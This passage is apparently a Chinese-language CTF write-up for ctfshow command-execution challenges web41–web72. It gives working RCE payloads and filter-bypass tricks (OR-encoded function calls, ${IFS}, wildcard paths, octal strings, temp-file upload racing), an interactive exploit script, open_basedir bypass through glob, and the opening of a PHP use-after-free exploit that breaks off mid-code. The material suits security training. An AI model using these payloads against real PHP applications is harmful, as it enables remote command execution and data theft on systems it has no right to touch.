}\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n```\n\n大体意思就是从进行异或的字符中排除掉被过滤的然后在判断异或得到的字符是否为可见字符。\n\n**exp.py**\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将php写入环境变量需手动运行\nif(len(argv)!=2):\n   print(\"=\"*50)\n   print('USER：python exp.py <url>')\n   print(\"eg：  python exp.py http://ctf.show/\")\n   print(\"=\"*50)\n   exit(0)\nurl=argv[1]\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"rce_or.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n   data={\n       'c':urllib.parse.unquote(param)\n       }\n   r=requests.post(url,data=data)\n   print(\"\\n[*] result:\\n\"+r.text)\n```\n\n在文件中用cmd命令:\n\npython exp.py url(记得https改成http，我找了好久才找到错误的原因)\n\n即可获取flag!\n\n方法二\n\n1.用字符手动构造payload\n\n(system)(‘ls’)\n\nc=(\"%13%19%13%14%05%0d\"|\"%60%60%60%60%60%60\")(\"%00%0c%13%00\"|\"%27%60%60%27\")\n\n(system)(cat flag.php)\n\nc=(\"%13%19%13%14%05%0d\"|\"%60%60%60%60%60%60\")(\"%03%01%14%00%06%0c%01%07%00%10%08%10\"|\"%60%60%60%20%60%60%60%60%2e%60%60%60\") \n\n2.用脚本自动生成payload\n\npython\n\n```python\nimport re\nimport urllib\nfrom urllib import parse\nhex_i = \"\"\nhex_j = \"\"\npattern='/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\nstr1=[\"system\",\"ls\"]//要构造的字符串 system 和 ls\nfor p in range(2):\n    t1 = \"\"\n    t2 = \"\"\n    for k in str1[p]:\n        for i in range(256):\n            for j in range(256):\n                if re.search(pattern,chr(i)) :\n                    break\n                if re.search(pattern,chr(j)) :\n                    continue\n                if i < 16:\n                    hex_i = \"0\" + hex(i)[2:]\n                else:\n                    hex_i=hex(i)[2:]\n                if j < 16:\n                    hex_j=\"0\"+hex(j)[2:]\n                else:\n                    hex_j=hex(j)[2:]\n                hex_i='%'+hex_i\n                hex_j='%'+hex_j\n                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))\n                if(c ==k):\n                    t1=t1+hex_i\n                    t2=t2+hex_j\n                    break\n            else:\n                continue\n            break\n    print(\"(\\\"\"+t1+\"\\\"|\\\"\"+t2+\"\\\")\")\n```\n\n得出的结果与手动构造一样，但相抵便捷一点\n\n## web42\n\n### #重定向丢弃的绕过\n\n![image-20241203113618790](./../image/achieve/202411/命令执行--ctfshow/image-20241203113618790.png)\n\n解析代码:system($c.\" >/dev/null 2>&1\");\n\n- system() 是PHP中的一个函数，用于执行外部程序，并显示输出。\n- $c 是一个变量，它应该包含要执行的命令的字符串。\n- \\>/dev/null 是重定向操作符，它的作用是将标准输出（stdout）重定向到/dev/null，一个特殊的设备文件，用于丢弃所有写入其中的数据。\n- 在类Unix系统中,/dev/null,或称空设备,**是一个特殊的设备文件**,它丢弃一切写入其中的数据(但报告写入操作成功)\n- 2>&1 是另一个重定向操作符，它的作用是将标准错误输出（stderr，文件描述符为2）重定向到标准输出（stdout，文件描述符为1）的当前位置。在这个上下文中，因为标准输出已经被重定向到/dev/null，所以**标准错误输出也会被重定向到**/dev/null。\n\n**所以这里是不进行回显**，输入的内容会被丢弃，该怎么办呢？答案是可以使用 `\";\" ,\"||\" ,\" & \",\" && \" `分隔，如?c=ls&&pwd. 执行的时候会将两个都正常执行，但由于重定向，后面的pwd指令的结果会被丢弃而不被输出\n\n### **知识点:通道符**\n\n; //分号\n\n| //只执行后面那条命令\n\n|| //只执行前面那条命令\n\n& //两条命令都会执行\n\n&& //两条命令都会执行\n\n### **知识点:重定向**\n\n重定向(Redirect)就是通过各种方法**将各种网络请求重新定个方向转到其它位置**\n\n重定向是网页制作中的一个知识。假设你现在所处的位置是一个论坛的登录页面，你填写了帐号，密码，点击登陆，如果你的帐号密码正确，就自动跳转到论坛的首页，不正确就返回登录页；**这里的自动跳转，就是重定向的意思**。或者可以说，**重定向就是，在网页上设置一个约束条件，条件满足，就自动转入到其它网页、网址。**\n\n**解题思路:**\n\n**1.查看目录:?c=ls;ls**\n\n**语句拼接后是system(ls;ls**>/dev/null 2>&1**);由于;的作用是逐步执行，由于重定向，后面的ls执行的结果会被丢弃而不会输出**\n\n**2.查看flag.php:?c=tac flag.php;ls**\n\n**同1的解释**\n\n**最后成功获得flag!**\n\n## web43\n\n### #过滤+重定向\n\n![image-20241203113808719](./../image/achieve/202411/命令执行--ctfshow/image-20241203113808719.png)\n\n**正常的过滤+重定向**\n\n;分号用不了那就用别的管道符\n\npayload:\n\n```\n?c=ls&&ls---查看目录\n```\n\n当时我传进去后发现没有回显，以为是我自己理解错了，结果是参数处理错误，意思就是当?c=ls&&ls时服务器只是将ls识别成c的传递值，而不是ls&&ls，当他们经过url编码后服务器才会把完整的ls&&ls当成是给c传递的值，所以我们的payload应该是:\n\n```\n?c=ls%26%26ls\n\n?c=tac flag.php%26%26ls---查看flag\n```\n\n当然||和|,&都是可以的，但||和|不是中间件，&是中间件，所以需要解析\n\n## web44\n\n![image-20241203114948954](./../image/achieve/202411/命令执行--ctfshow/image-20241203114948954.png)\n\n跟上题一样\n\n## web45\n\n![image-20241203115011171](./../image/achieve/202411/命令执行--ctfshow/image-20241203115011171.png)\n\n一样\n\n## web46\n\n![image-20241203115023290](./../image/achieve/202411/命令执行--ctfshow/image-20241203115023290.png)\n\n## wbe47\n\n![image-20241203115242537](./../image/achieve/202411/命令执行--ctfshow/image-20241203115242537.png)\n\n只是过滤了很多cat的替代命令，tac可以正常用\n\n## web48\n\n![image-20241203115319047](./../image/achieve/202411/命令执行--ctfshow/image-20241203115319047.png)\n\n还是没过滤掉tac\n\n**常见的命令工具:**\n\nsed：\n\n- 是一个流编辑器，用于对文本进行过滤和转换。\n- 可以逐行读取文件或管道输入，并根据指定的规则对文本进行处理。\n- 支持删除、替换、插入、追加文本等操作，以及使用正则表达式进行匹配和替换。\n\ncut：\n\n- 用于从文本文件中提取列或字段。\n- 可以按字节、字符或指定分隔符来切割文本。\n- 支持从文本中提取指定范围的字符或字段，并输出到标准输出或指定文件。\n\nawk：\n\n- 是一个强大的文本处理工具，用于对文本文件进行格式化、扫描和处理。\n- 可以使用模式匹配和动作对文本进行过滤和转换。\n- 支持内置变量和自定义函数，以及使用正则表达式进行匹配和替换。\n- 常用于处理和分析日志文件、数据报表等。\n\nstrings：\n\n- 用于从二进制文件中提取可打印的字符串。\n- 可以扫描文件并输出所有长度超过指定阈值的连续可打印字符序列。\n- 常用于分析二进制文件的内容，如可执行文件、库文件等。\n\nod：\n\n- 是一个八进制转储工具，用于以不同的格式（如八进制、十六进制、十进制等）显示文件内容。\n- 可以读取二进制文件，并以指定的格式输出其内容。\n- 常用于分析二进制文件的结构和内容。\n\ncurl：\n\n- 是一个命令行工具，用于在命令行下执行URL传输操作。\n- 支持多种协议，如HTTP、HTTPS、FTP等。\n- 可以用于下载或上传文件，以及发送GET、POST等HTTP请求。\n- 常用于自动化脚本中，用于从Web服务器获取数据或向Web服务器发送数据。\n\n## web49\n\n![image-20241203115353682](./../image/achieve/202411/命令执行--ctfshow/image-20241203115353682.png)\n\n比上次多过滤了一个百分号，但这是当百分号作为参数传递的时候才会被过滤，而url编码不会\n\n：在进行URL编码时，通常不会直接过滤掉百分号，因为百分号是编码机制的一部分。\n\n所以还是可以正常用的\n\n## web50\n\n![image-20241203115417447](./../image/achieve/202411/命令执行--ctfshow/image-20241203115417447.png)\n\n过滤了两个编码，%09和%26，分别是制表符和&符号，但我们依旧可以用其他的去代替他们\n\n用<>代替空格，用||去代替&&\n\n```\n/?c=tac<fla%27%27g.php||\n/?c=tac<>fl\\ag.php||ls\n```\n\n## web51\n\n![image-20241203115459175](./../image/achieve/202411/命令执行--ctfshow/image-20241203115459175.png)\n\n这次居然过滤了tac，另外同cat功能的函数还有： cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev\n\n所以我们使用nl进行绕过：?c=nl<>fl\\ag.php||ls\n\n或者绕过过滤:?c=ta\\c<>fl\\ag.php||ls\n\n## web52\n\n![image-20241203115532705](./../image/achieve/202411/命令执行--ctfshow/image-20241203115532705.png)\n\n?c=ta\\c${IFS}fl\\ag.php||\t发现flag不在里面\n\n![image-20241203115552580](./../image/achieve/202411/命令执行--ctfshow/image-20241203115552580.png)\n\n我们看看根目录呢\n\n?c=ls${IFS}/||ls\n\n![image-20241203115605412](./../image/achieve/202411/命令执行--ctfshow/image-20241203115605412.png)\n\n发现flag在根目录里面\n\n?c=ta\\c${IFS}/fl\\ag||ls拿取根目录的flag\n\n## web53\n\n![image-20241203115627179](./../image/achieve/202411/命令执行--ctfshow/image-20241203115627179.png)\n\n意思是我们像c传递的值会被当成system的命令，并将执行结果赋值给d，然后输出d，做法是一样的没有变\n\n?c=ta\\c${IFS}fl\\ag.php\n\n## web54\n\n![image-20241203115650126](./../image/achieve/202411/命令执行--ctfshow/image-20241203115650126.png)\n\n\\*：星号，通常用作通配符。里面的意思是所有包含其中字符的字符串都会被过滤，例如*f.*l.*a.*g意思就是只要传递的参数中包含flag字符串都会被过滤，所以flag绕过方式就不可以了。\n\n如说cat，.*当出现cat这个整体时才会进行匹配，会尽可能匹配较多字符，ca，c之类的字符不会进行匹配，tac为什么不能用t??,是因为还有一个跟它一样长度的命令top\n\n解法一:\n\n使用mv命令把flag文件重命名，再使用uniq查看a.txt\n\nc= mv${IFS}fla?.php${IFS}a.txt\n\nc=uniq${IFS}a.txt\n\n解法二:\n\n凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。 只能把全路径写出来只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的只有/bin/cat命令,所以构造payload:\n\n?c=/bin/ca?${IFS}????.??? \n\n解法三:直接用uniq查看\n\nc=uniq${IFS}f???.php\n\n### 知识点:uniq\n\nuniq命令的基本功能是检测和删除文本文件中相邻的重复行，或者仅显示重复行、不重复行\n\n解法四:\n\nc=grep${IFS}-r${IFS}'ctfshow'${IFS}.\n\n### 知识点:grep的常用选项与示例\n\n1. 基本搜索：\n\n- grep \"pattern\" filename：在文件filename中搜索包含pattern的行。\n\n1. 显示匹配行的行号：\n\n- grep -n \"pattern\" filename：在输出匹配行的同时，显示其行号。\n\n1. 反向匹配：\n\n- grep -v \"pattern\" filename：输出不包含pattern的行。\n\n1. 统计匹配行的数量：\n\n- grep -c \"pattern\" filename：统计并输出匹配pattern的行的数量。\n\n1. 递归搜索：\n\n- grep -r \"pattern\" directory：在目录directory及其子目录中递归搜索包含pattern的文件。\n\n1. 使用正则表达式：\n\n- grep -E \"pattern1|pattern2\" filename：使用扩展正则表达式，匹配pattern1或pattern2。\n\n1. 不区分大小写：\n\n- grep -i \"pattern\" filename：在搜索时不区分大小写。\n\n## web55\n\n### #无字母rce\n\n![image-20241203115825635](./../image/achieve/202411/命令执行--ctfshow/image-20241203115825635.png)\n\n这次把字母过滤了\n\n**解法一:base64程序查看flag.php**\n\n由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。\n\n?c=/bin/base64 flag.php\n\n替换后变成\n\n?c=/???/????64 ????.???\n\n**解法二:采用数字编码**\n\n$'\\xxx' 语法用于表示使用八进制（octal）编码的字符\n\n**$'\\164\\141\\143' $'\\146\\154\\141\\147\\56\\160\\150\\160**\n\n**解法三:临时文件rce**\n\n利用文件上传进行命令执行\n\n1.构造POST数据包(或使用postman直接上传文件)\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"https://41d5615f-8af8-425d-af5e-b0efc6a90284.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n<!--链接是当前打开的题目链接-->\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n2.构造php文件进行上传\n\n\\#!/bin/sh\n\nls\n\n3.构造poc执行命令\n\n?c=.%20/???/????????[@-[]\n\n4.上传请求包\n\n![image-20241203115953670](./../image/achieve/202411/命令执行--ctfshow/image-20241203115953670.png)\n\n可以看到有两个文件，接下来我们访问flag.php文件，把php文件内容改一下\n\n```\n#!/bin/sh\n\ncat flag.php\n```\n\n即可获得flag!\n\n## web56\n\n### #无数字字母Rce\n\n![image.png](./../image/achieve/202411/命令执行--ctfshow/1729867285696-8ef1f841-4da9-4137-9fe6-893735bb43a5.webp)\n\n**先看看哪些字符是可以用的**\n\n**用php脚本**\n\n```php\n#输出可用字符\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\</i\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n#可用字符:# ) * + , - . / : = ? @ [ \\ ] ^ _ | } ~ \n?>\n```\n\n没有被过滤的字符:# ) * + , - . / : = ? @ [ \\ ] ^ _ | } ~ \n\n因为没有过滤. 而点命令在linux中是source的缩写，通过点命令，我们可以在没有执行权限的情况下执行sh命令。\n\n### 解题思路:\n\n通过POST上传一个文件，文件内容是要执行的命令，并且同时点命令执行该文件，形成条件竞争。这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[] 来构成这个路径，[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位），之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。\n\n1.构造POST数据包或使用postman传递\n\n构造数据包\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"http://227f0ddd-0640-4c46-b921-4a7fb674c137.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n<!--链接是当前打开的题目链接-->\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n2.编写php文件\n\n```php\n#!/bin/sh\nls\n```\n\n3.构造poc执行命令\n\n```\n?c=.%20/???/????????[@-[]\n```\n\n之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。\n\n4.上传文件然后用bp抓包，加上poc执行命令，然后发送\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729930351348-50661fd2-280a-40ee-9b87-e304bceceb02.png)\n\n看到flag.php了，修改php文件命令继续上传\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729930528011-c8cc956f-2e2d-45f0-9afd-b64644576961.png)\n\n拿到flag！\n\n## web57\n\n![image.png](./../image/achieve/202411/命令执行--ctfshow/1729930831607-9a87b068-075d-4221-89c7-adac1f189207.webp)\n\n先看看能用哪些字符\n\n```\n! # $ ( ) + / : @ \\ ] ^ _ { | } ~ \n```\n\n.号被过滤了，不能用bash命令，那就另辟出路\n\n### 解题思路:利用linux的$(())构造出36\n\n利用linux的$(())构造出36\n\n$(())=0\n\n$((~ $(()) ))=-1\n\n通过`$(())`操作构造出36： `$(())` ：代表做一次运算，因为里面为空，也表示值为0\n\n`$(( ~$(()) )) `：对0作取反运算，值为-1\n\n`$(( $((~$(()))) $((~$(()))) ))`： -1-1，也就是(-1)+(-1)为-2，所以值为-2\n\n`$(( ~$(( $((~$(()))) $((~$(()))) )) )) `：再对-2做一次取反得到1，所以值为1\n\n故我们在`$(( ~$(( )) ))`里面放37个`$((~$(())))`，得到-37，取反即可得到36:\n\n```python\nget_reverse_number = \"$((~$(({}))))\" # 取反操作\nnegative_one = \"$((~$(())))\"        # -1\npayload = get_reverse_number.format(negative_one*37)\nprint(payload)\n```\n\n## web58-65\n\n以58为例\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729939289573-10e3b495-d4a3-4352-bc6a-0273394c441d.png)\n\n## eval()函数\n\neval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。\n\n使用方法：eval(php代码)\n\n简单来说这里是远程代码注入的rce\n\n用bp抓包，修改请求方法为POST，send了几次之后发现system()函数，passthru()函数都是被禁用了的，但后来发现highlight_file()函数没有被过滤，所以采用highlight_file()函数\n\n## 两种解法\n\n### highlight_file函数查看\n\n```\nc=highlight_file(\"flag.php\");\n```\n\n- highlight_file()函数是 PHP 中用于语法高亮显示文件源代码的一个函数。它读取指定的文件，并返回带有 HTML 语法高亮标记的源代码\n\n### include+伪协议\n\nc=include($_POST['w']);&w=php://filter/read=convert.base64-encode/resource=flag.php\n\n### 无参数读取\n\n```\nshow_source(next(array_reverse(scandir(current(localeconv())))));\n```\n\n### show_source()函数\n\n是 PHP 中用于显示 PHP 源代码的一个函数\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729944668855-0fe90f7c-dd74-4ee4-839b-e4cf8b1b5dda.png)\n\n是可以拿到flag的哈\n\n# web66\n\n这次的题目是一样的，但过滤不太一样，show_source()函数被过滤了\n\n那就用highlight_file()函数看看\n\n结果发现.....\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729950081135-53bb1560-59bd-49e8-97fe-99ff9ac5d903.png)\n\n用参数输入include做也是一样\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729950239757-90e70843-021d-4099-b21d-a8f4acb3d3d4.png)\n\n侮辱性极强，看我们拿下他\n\n既然不在这个文件里面，那我们扫一下目录\n\n打印目录：print_r(scandir(\"/\"));//如果不在网站目录，就往前找使用../\n\n### scandir()函数\n\n- **功能**：返回指定目录中的文件和目录数组。\n- **用法**：`$files = scandir($directory, $sorting_order);`\n\n- `$directory` 是你想要扫描的目录的路径。\n- `$sorting_order` 是可选的排序顺序，可以是 `SCANDIR_SORT_ASCENDING`（升序，默认值），`SCANDIR_SORT_DESCENDING`（降序），`SCANDIR_SORT_NONE`（不排序）。\n- 返回值是一个包含目录中所有文件和目录名称的数组（包括 `.` 和 `..`），如果失败则返回 `false`。\n\n### `readdir()`函数\n\n- **功能**：从已经打开的目录中读取下一个文件的名称。\n- **用法**：`$filename = readdir($handle);`\n\n- `$handle` 是之前通过 `opendir()` 打开的目录句柄。\n- 返回值是目录中下一个文件的名称（字符串），如果已经读取到目录末尾或出错则返回 `false`。\n\n### `opendir()`函数\n\n- **功能**：打开一个目录句柄，供其他目录函数使用。\n- **用法**：`$handle = opendir($path);`\n\n- `$path` 是你想要打开的目录的路径。\n- 返回值是一个目录句柄（resource 类型），如果失败则返回 `false`。\n\n先用scandir列根目录内容，用print_r回显。\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729950731355-ef566b34-560f-4f25-9071-6b68a5f98500.png)\n\n看到一个flag.txt\n\n最后正常查看这个文件就行(记得flag.txt是在根目录，所以应该是highlight_file('/flag.txt'))\n\n另外的:新思路：PHP原生类可遍历目录 c=$dir=new DirectoryIterator(\"/\");echo $dir; (url编码：c=%24dir%3dnew%20DirectoryIterator(%22%2f%22)%3b%0aforeach(%24dir%20as%20%24f)%7b%0a%20%20%20%20echo(%24f.'%3cbr%3e')%3b%7d)\n\n# web67\n\n这次print_r()函数被禁用了，我们换一个\n\nc=var_dump(scandir('/'));\n\nc=var_export(scandir('/'));\n\n## print_r()函数替换函数\n\n### var_dump()\n\n- `var_dump()` 提供了比 `print_r()` 更详细的信息，包括变量的类型和长度（对于字符串）。\n- 它对于调试非常有用，因为它显示了更多关于变量的内部信息\n\n### var_export()\n\n- `var_export()` 返回或输出关于变量的字符串表示，这个表示可以作为有效的 PHP 代码来执行（如果变量是数组或对象的话，可能会需要一些调整）。\n- 它对于生成代码示例或配置数据很有用。\n\n# web68\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729951980194-9294209a-ac98-459a-85da-447bbaf62f7c.png)\n\n直接提示highlight_file()函数不能用了\n\n没关系，那就用其他的\n\nc=readgzfile(\"/flag.txt\");\n\n### readgzfile()函数\n\n是 PHP 中用于读取整个 gzip 压缩文件的内容，并将其作为字符串返回的函数。这个函数不会直接输出文件内容到浏览器或终端，而是将内容存储在变量中供后续使用。\n\nc=require(\"/flag.txt\");\n\n### require()函数\n\n是 PHP 中用于包含并运行指定文件的一个语句。与 `include()` 函数类似，`require()` 也会将指定文件的内容包含到当前脚本中\n\nc=include(\"/flag.txt\");\n\n### include()函数\n\ninclude()可以引入并执行一个指定的文件的内容，如果那个被引入的文件包含了HTML代码或PHP代码，这些代码会在当前的脚本中执行，从而间接地在最终的输出中显示内容。\n\n也可以用参数输入include+伪协议来做\n\nc=include($_POST['w']);&w=php://filter/convert.base64-encode/resource=/flag.txt\n\n# web69\n\n跟68一样的提示\n\n先试试老方法\n\n这次不能用var_dump()函数了，我们换成var_export()是可以用的\n\n# web70\n\n查看题目\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729997334358-8ae6bb16-2dc7-4263-980c-1008b43c8bbf.png)\n\n这次新增了两个函数哈，我们先逐个了解一下\n\n### error_reporting() 函数\n\n`error_reporting()` 函数是 PHP 中用于设置错误报告级别的函数。它允许你控制哪些类型的错误、警告和通知会被显示出来。这个函数对于开发和调试过程特别有用，因为它允许开发者根据需要调整错误报告的详细程度。\n\n### **ini_set()函数**\n\n`ini_set()` 函数是 PHP 中用于设置配置选项（ini 配置指令）的值的一个函数。这些配置选项通常位于 `php.ini` 文件中，但 `ini_set()` 允许你在运行时动态地更改这些设置，而无需修改 `php.ini` 文件本身。\n\n目前来看是对题目没啥用，我们正常解看看\n\n发现还是可以正常做出来的，那就没什么好讲的\n\n# web71\n\n查看题目，好像跟之前的不太一样\n\n有一个index.php文件，下载看看\n\n![img](./../image/achieve/202411/命令执行--ctfshow/1729998377034-05e78540-dc5c-420b-8134-b9eca1e5b3b1.png)\n\n### $s = ob_get_contents();\n\n- 这行代码获取当前输出缓冲区的内容，并将其存储在变量`$s`中。输出缓冲允许你临时存储输出而不是直接发送到浏览器。这通常用于在发送最终输出之前进行进一步的处理或修改。\n\n### ob_end_clean();\n\n- 这行代码结束当前的输出缓冲并丢弃缓冲内容（尽管我们已经将其保存在`$s`中）。这意味着在调用`ob_end_clean()`之后，任何新的输出将直接发送到浏览器，而不是被缓冲。\n\necho preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\n\n- 这行代码使用`preg_replace()`函数对变量`$s`的内容进行正则表达式替换。它查找所有数字（0-9）和小写字母（a-z），并将它们替换为问号（\"?\"）。正则表达式中的`i`修饰符表示不区分大小写，但在这个特定的表达式中，由于只指定了小写字母，所以`i`实际上没有作用。最终，处理后的字符串通过`echo`输出。\n\n### 对缓冲区的理解\n\n在 `eval()` 执行后，这行代码获取当前输出缓冲区的内容，并将其存储在变量 `$s` 中。输出缓冲区可能包含由 `$c` 中的代码生成的任何输出。\n\n所以这段代码的目的是捕获执行 `$c` 中的代码后产生的输出，然后对这个输出进行处理（即替换掉所有的数字和小写字母），而不是直接处理 `$c` 中的代码字符串本身。\n\n当PHP脚本执行时，它可能会生成各种输出，比如HTML内容、文本、图像等。默认情况下，这些输出会立即发送到客户端（如浏览器）。但是，通过使用输出缓冲函数，PHP允许开发者将这些输出先存储在内存中的一个缓冲区中，而不是立即发送。\n\n那我们应该做的有两件事:\n\n1.绕过正则匹配\n\n2.绕过缓冲区\n\n这里我们只需要提前退出缓冲区就可以避免我们eval执行的代码输出的内容经过正则匹配，因此不需要绕过正则匹配\n\n## 对于绕过缓冲区\n\n### 1.提前送出缓冲区\n\n可用的函数:\n\n#### ob_flush()函数\n\n`ob_flush()` 函数在 PHP 中用于刷新（输出）当前输出缓冲区的内容。当输出缓冲被激活时（通常通过 `ob_start()` 函数），PHP 脚本的输出不会立即发送到客户端（如浏览器），而是先存储在内部缓冲区中。`ob_flush()` 函数会将缓冲区的内容发送到客户端，但不一定清空缓冲区本身，这取决于 PHP 的配置和输出缓冲机制的状态。\n\n#### flush()函数\n\n- `flush()` 函数尝试将输出缓冲区的内容发送到客户端。但是，如果 PHP 的输出缓冲和 Web 服务器的输出缓冲同时被激活，`flush()` 可能不会清空 PHP 的输出缓冲区，只会尝试清空 Web 服务器的输出缓冲区。\n- `ob_flush()` 函数确保 PHP 的输出缓冲区内容被发送到客户端。如果同时调用了 `flush()`，则可能尝试同时清空 PHP 和 Web 服务器的输出缓冲区。\n\n#### ob_end_flush()函数\n\n`ob_end_flush();` 函数在 PHP 中用于结束当前的输出缓冲区，并将缓冲区的内容发送到客户端（如浏览器）。这个函数结合了 `ob_end_clean();` 和 `ob_flush();` 的功能：它首先会发送缓冲区的内容（如果缓冲区不为空），然后关闭（结束）当前的输出缓冲块。\n\n1. **与** `**ob_end_clean();**` **的区别**：\n\n- `ob_end_clean();` 只是清空（丢弃）缓冲区的内容，并不发送它到客户端。\n- `ob_end_flush();` 则会发送内容，并结束缓冲。\n\n1. **与** `**ob_flush();**` **的区别**：\n\n- `ob_flush();` 只会发送缓冲区的内容到客户端，但不会结束缓冲块。这意味着缓冲区仍然存在，之后的输出仍然可以被添加到这个缓冲区中（直到另一个 `ob_end_...` 函数被调用）。\n\n### 2.结束程序\n\n提前终止程序，即执行完代码直接退出，可以调用的函数有：\n\n#### exit()函数\n\n- 当 `exit()` 被调用时，PHP 脚本会立即停止执行，后面的代码将不会被运行。\n- `exit()` 函数在 PHP 中用于终止脚本的执行。当 `exit()` 被调用时，脚本会立即停止运行，并且不再执行后面的代码。此外，`exit()` 函数还可以选择性地输出一条消息到客户端（如浏览器）。\n\n#### die()函数\n\n`die()` 函数的行为实际上与 exit() 函数完全相同；它们都可以用来终止脚本，并且都可以接受一个可选的字符串参数作为要输出的消息。在 PHP 文档中，`die()` 函数有时被描述为 `exit()` 函数的别名，专门用于在出现致命错误时终止脚本。\n\npayload示例：\n\n```plain\nc=include('/flag.txt');exit();\nc=include('/flag.txt');die();\n```\n\n所以以上两个方法，都只是在原来的dpayload后面加上对应的函数就可以了，做法其实大同小异\n\n## web72\n\n正常的用71的方法做一下\n\n```\nc=var_export(scandir('/'));exit();\n```\n\n发现scandir()函数不能用了，不能正常查看目录\n\n后来查过报错后发现这个错误信息显示的是在尝试使用 `scandir()` 函数打开一个目录时，操作没有被允许。这通常是因为当前运行 PHP 脚本的用户没有足够的权限去访问指定的目录。这是由于 open_basedir 限制，这个操作被禁止了。open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。\n\n当前配置只允许访问 /var/www/html/ 目录及其子目录，但不允许访问其他目录。\n\n解题思路:\n\n此题过滤了scandir(),readdir(),opendir()\n\n首先要查看flag所在的地方，这里可以用glob伪协议，此协议筛选目录不受open_basedir的制约\n\nPHP 的 `glob()` 函数，它用于查找与指定模式匹配的文件路径。`glob()` 函数返回一个包含匹配文件或目录的数组，或者在没有匹配项时返回 `false`\n\n### 1、目录文件扫描\n\n```\nc= ?><?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>\n```\n\n```\nc=?><?php $a=new DirectoryIterator(\"glob:///*\");//*创建一个DirectoryIterator对象，遍历根目录*\n\nforeach($a as $f)//*// 遍历每个条目*\n\n{\n\n   echo($f->__toString().' ');//*// 输出条目的名称，并添加一个空格*\n\n}\n\nexit(0);\n\n?>\n```\n\n查看到目录有flag0.txt文件\n\n2、读取文件内容 \n\n该题需要使用UAF脚本，利用了 php 的垃圾回收机制。代码涉及到偏移地址之类的\n\n### UAF脚本\n\nUAF（Use After Free）漏洞的脚本通常涉及对已经被释放的内存块（堆块）的非法访问或操作。这种漏洞常常发生在编程中，当程序释放了一个内存块后，没有正确地将其指针置为空（NULL）或进行其他形式的清理，导致后续代码仍然可以通过该指针访问已经释放的内存区域。\n\n在编写UAF漏洞的利用脚本时，攻击者通常会尝试执行以下步骤：\n\n1. **申请内存块**：首先，攻击者会通过合法的手段（如malloc、new等）申请一个或多个内存块。\n2. **释放内存块**：接着，攻击者会释放其中一个或多个内存块，但故意不将相关的指针置为空。\n3. **利用未置空的指针**：在内存块被释放后，攻击者会尝试通过之前未置空的指针来访问或修改这块已经释放的内存区域。由于这块内存可能已经被重新分配给其他用途，因此这种访问或修改可能会导致不可预测的行为，包括信息泄露、任意代码执行等。\n4. **实现攻击目标**：通过精心构造的输入或操作，攻击者可以利用UAF漏洞实现各种攻击目标，如获取敏感信息、提升权限、执行任意代码等。\n\n这里直接给出大佬的脚本:\n\n```php\nc=?><?php\npwn(\"ls /;cat /flag0.txt\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = 